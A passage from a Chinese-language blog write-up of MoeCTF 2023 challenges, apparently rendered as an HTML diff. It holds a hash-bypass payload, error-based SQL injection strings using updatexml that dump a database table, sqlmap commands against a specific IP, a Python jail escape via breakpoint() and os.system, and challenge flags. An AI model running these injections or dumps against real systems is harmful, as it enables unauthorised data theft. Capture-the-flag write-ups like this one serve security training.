class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_POST</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/login&quot;</span>:<br>                body = self.rfile.read(<span class="hljs-built_in">int</span>(self.headers.get(<span class="hljs-string">&quot;Content-Length&quot;</span>)))<br>                payload = json.loads(body)<br>                params = json.loads(decrypt(payload[<span class="hljs-string">&quot;params&quot;</span>]))<br>                <span class="hljs-built_in">print</span>(params)<br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == <span class="hljs-string">&quot;admin&quot;</span>:<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == params.get(<span class="hljs-string">&quot;password&quot;</span>):<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;same&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                hashed = gethash(params.get(<span class="hljs-string">&quot;username&quot;</span>),params.get(<span class="hljs-string">&quot;password&quot;</span>))<br>                <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users.items():<br>                    <span class="hljs-keyword">if</span> hashed == v:<br>                        data = &#123;<br>                            <span class="hljs-string">&quot;user&quot;</span>:k,<br>                            <span class="hljs-string">&quot;hash&quot;</span>:hashed,<br>                            <span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>                        &#125;<br>                        self.send_response(<span class="hljs-number">200</span>)<br>                        self.end_headers()<br>                        self.wfile.write(json.dumps(data).encode())<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>                        <span class="hljs-keyword">return</span><br>                self.send_response(<span class="hljs-number">403</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;Invalid username or password&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    server = http.server.HTTPServer((<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">9999</span>), MyHandler)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure>
+<p>代码审计后：需要<code>base64</code>5次，<code>username</code>和<code>password</code>不能相等，<code>username</code>不能是<code>admin</code>，要求输入的<code>username</code>和<code>password</code>的<code>hash</code>和前面<code>username=admin，password=admin</code>的<code>hash</code>值相同，才能出flag，使用不同类型、较短的payload</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696038164546-e761a2de-e0a2-4169-9f8a-7e9b337c49d9.png#averageHue=%23fbfbfa&clientId=u0b43effb-f7cd-4&from=paste&height=844&id=ub4d0a4fc&originHeight=2109&originWidth=3604&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=295748&status=done&style=none&taskId=uc0c695b2-9206-4431-9645-51c584924f7&title=&width=1441.6" srcset="/img/loading.gif" lazyload alt="1696038159743.png"></h2><p>payload：<code>VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJFeWVIaFZiR1J6VkZaRmQyTkVUbGhXYldoUVdsY3hVbVZWT1ZsaVIwWlNUVWR6ZVZaR1dtNWtNVUpTVUZRd1BRPT0=</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696038199001-3801d2bf-4ff5-4508-af79-803429d37965.png#averageHue=%23f9f9f9&clientId=u0b43effb-f7cd-4&from=paste&height=518&id=u629a5d6e&originHeight=1296&originWidth=3434&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=405517&status=done&style=none&taskId=u11d90fde-9d21-407c-8e12-b8c55995ff4&title=&width=1373.6" srcset="/img/loading.gif" lazyload alt="1696038191779.png"><br><code>moectf&#123;C0nGUrAti0ns!_y0U_hAve_sUCCessFUlly_siGnin!_iYlJf!M3rux9G9Vf!Jox&#125;</code></p>
+<h2 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696045611352-71a1b036-a467-4376-b133-cbb36365ebc7.png#averageHue=%2377b76d&clientId=u0b43effb-f7cd-4&from=paste&height=812&id=uaf579ebf&originHeight=2029&originWidth=3839&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=363617&status=done&style=none&taskId=udbde2fe8-8f80-4f9a-be09-b1fc571c610&title=&width=1535.6" srcset="/img/loading.gif" lazyload alt="1696045604693.png"><br>进入logger.php<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696045676702-78c466af-ea77-4cfb-af01-dc4b5d16165a.png#averageHue=%23fefdfd&clientId=u0b43effb-f7cd-4&from=paste&height=440&id=u564ce922&originHeight=1101&originWidth=2396&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=142673&status=done&style=none&taskId=u9858db6a-4a16-4e95-aca6-8288e8bace4&title=&width=958.4" srcset="/img/loading.gif" lazyload alt="1696045671607.png"><br>使用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plsql">ip=1&amp;user-agent=1&amp;time=12 and updatexml(1,concat(0x7e,(database()),0x7e),1)<br>#数据插入失败: XPATH syntax error: &#x27;~wordpress~&#x27;<br><br>ip=1&amp;user-agent=1&amp;time=12 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)<br>#数据插入失败: XPATH syntax error: &#x27;~secret_of_kokomi,visitor_record&#x27;<br><br>ip=1&amp;user-agent=1&amp;time=12 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;secret_of_kokomi&quot;),0x7e),1)<br>#数据插入失败: XPATH syntax error: &#x27;~id,content~&#x27;<br><br>ip=1&amp;user-agent=1&amp;time=12 and updatexml(1,concat(0x7e,(select group_concat(id,0x7e,content) from secret_of_kokomi limit 0,1),0x7e),1)<br>ip=1&amp;user-agent=1&amp;time=12 and updatexml(1,concat(0x7e,(select substring(group_concat(id,&quot;:&quot;,content),50,32) from secret_of_kokomi),0x7e),1)<br>#moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125;<br></code></pre></td></tr></table></figure>
+<p>也可以用<code>sqlmap</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> --data=<span class="hljs-string">&quot;ip=1&amp;useragent=1&amp;time=123&quot;</span> --dbs<br><br>python sqlmap.py -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> --data=<span class="hljs-string">&quot;ip=1&amp;useragent=1&amp;time=123&quot;</span> -D wordpress --tables --batch<br><br>python sqlmap.py -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> --data=<span class="hljs-string">&quot;ip=1&amp;useragent=1&amp;time=123&quot;</span> -D wordpress -T secret_of_kokomi --columns --batch<br><br>python sqlmap.py -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> --data=<span class="hljs-string">&quot;ip=1&amp;useragent=1&amp;time=123&quot;</span> -D wordpress -T secret_of_kokomi -C content --dump --batch<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051747520-39703a0e-86ab-4835-abb9-3091eaad8898.png#averageHue=%230e0d0d&clientId=u0b43effb-f7cd-4&from=paste&height=70&id=u14944c25&originHeight=174&originWidth=3769&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=40933&status=done&style=none&taskId=u14d336a4-e11b-4e6a-8f97-011814e7f8f&title=&width=1507.6" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051765058-ce0debf3-25d7-43a0-a8f2-2d91f5eb0a4f.png#averageHue=%23161514&clientId=u0b43effb-f7cd-4&from=paste&height=88&id=ud89f3c59&originHeight=221&originWidth=681&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=21644&status=done&style=none&taskId=uceec7c22-9935-40a8-8edd-6d79ac9aeb0&title=&width=272.4" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051776438-f0cbef0d-b445-489c-b16b-cae47cf05465.png#averageHue=%230f0f0e&clientId=u0b43effb-f7cd-4&from=paste&height=64&id=u814d1e96&originHeight=161&originWidth=3809&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=45220&status=done&style=none&taskId=u17af3386-326b-4d18-ab38-4b93d014828&title=&width=1523.6" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051825098-977e5669-904e-4ca3-9510-da442dd43f2c.png#averageHue=%23141212&clientId=u0b43effb-f7cd-4&from=paste&height=392&id=u5a4e3d52&originHeight=981&originWidth=621&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=64214&status=done&style=none&taskId=u680be62e-65de-4755-ac68-33ee34f1c90&title=&width=248.4" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051897156-c0266070-a939-4bfb-bf0c-532475a07bcc.png#averageHue=%23100f0f&clientId=u0b43effb-f7cd-4&from=paste&height=54&id=uc19d3a51&originHeight=134&originWidth=3796&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=35700&status=done&style=none&taskId=u7953faca-5e2b-4700-8c62-9e1b8d8828e&title=&width=1518.4" srcset="/img/loading.gif" lazyload alt="1696051890123.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051912788-47f377cc-4150-4e3d-a239-986355d526db.png#averageHue=%23131212&clientId=u0b43effb-f7cd-4&from=paste&height=184&id=u8c22864c&originHeight=461&originWidth=596&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=23428&status=done&style=none&taskId=ua99d4bd6-8ebd-445d-9db9-7825accb220&title=&width=238.4" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051981633-36ccd3ae-231b-4bd1-ae4e-f8a9c535159c.png#averageHue=%230f0e0e&clientId=u0b43effb-f7cd-4&from=paste&height=80&id=u69f510b6&originHeight=199&originWidth=3796&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=50035&status=done&style=none&taskId=uc969e655-7800-43e6-b427-769bbfe5cf1&title=&width=1518.4" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696052000303-da4526ec-9ef9-4161-93b3-74d1222e4704.png#averageHue=%23111110&clientId=u0b43effb-f7cd-4&from=paste&height=204&id=u18a90143&originHeight=509&originWidth=1534&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=40658&status=done&style=none&taskId=ubdf4e306-add0-42fd-94b5-9c6502ea54c&title=&width=613.6" srcset="/img/loading.gif" lazyload alt="image.png"><br><code>moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125;</code></p>
+<h2 id="moeworld"><a href="#moeworld" class="headerlink" title="**moeworld"></a>**moeworld</h2><p>注册<code>username=iwantflag；password=moectf666</code></p>
+<h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><h2 id="CCCCC"><a href="#CCCCC" class="headerlink" title="CCCCC"></a>CCCCC</h2><p>运行文件获得<br><code>moectf&#123;Pyth0n_1z_0ur_g00d_friendz&#125;</code></p>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>运行文件获得<br><code>moectf&#123;HAHA_C_1s_easy!&#125;</code></p>
+<h2 id="runme"><a href="#runme" class="headerlink" title="runme"></a>runme</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691994150985-9f528c42-81a8-4af0-893e-9afc3e8e8079.png#averageHue=%23252524&clientId=u6a837453-95fb-4&from=paste&height=535&id=u29b877aa&originHeight=1338&originWidth=2075&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=130911&status=done&style=none&taskId=u4e20526d-471a-42cf-9f2f-2510b4432d3&title=&width=830" srcset="/img/loading.gif" lazyload alt="image.png"><br><code>moectf&#123;0h_y0u_can_use_cmd!!!&#125;</code></p>
+<h2 id="runme2"><a href="#runme2" class="headerlink" title="runme2"></a>runme2</h2><p>放到kali中，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691994613924-3c0f4c3c-eda3-411d-a420-594a8ee36822.png#averageHue=%23242732&clientId=u6a837453-95fb-4&from=paste&height=809&id=uc097c576&originHeight=2023&originWidth=3470&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1251136&status=done&style=none&taskId=uffcf73db-8a41-4689-a11d-50c782e0b20&title=&width=1388" srcset="/img/loading.gif" lazyload alt="image.png"><br><code>moectf&#123;Run_me_in_linux!&#125;</code></p>
+<h1 id="Jail"><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h1><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>user_input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(user_input_data)))<br></code></pre></td></tr></table></figure>
+<p>使用breakpoint()函数绕过，breakpoint()是3.7以后引入的内置函数，可以用于断点调试，通过一次执行breakpoint后在里面再嵌套一层eval(input()),输入os.system()引入shell试试<br>或者对input_data重新赋值。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696693623229-70dd9583-aabc-4d92-a605-42ad8fe24427.png#averageHue=%23252833&clientId=u169ae2ec-159c-4&from=paste&height=808&id=uc0a0f389&originHeight=2021&originWidth=3346&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1223293&status=done&style=none&taskId=u6d090091-5fe9-42e5-ae3c-3456a116b8f&title=&width=1338.4" srcset="/img/loading.gif" lazyload alt="1696693543879.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>http://example.com/2023/10/13/MoeCTF2023/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/15/%E8%BF%87%E6%BB%A4%E9%80%9A%E9%85%8D%E7%AC%A6+%E5%8D%95%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%88%E9%A6%99%E5%B1%B1%E6%9D%AF%EF%BC%89/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/13/NewStarCTF/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
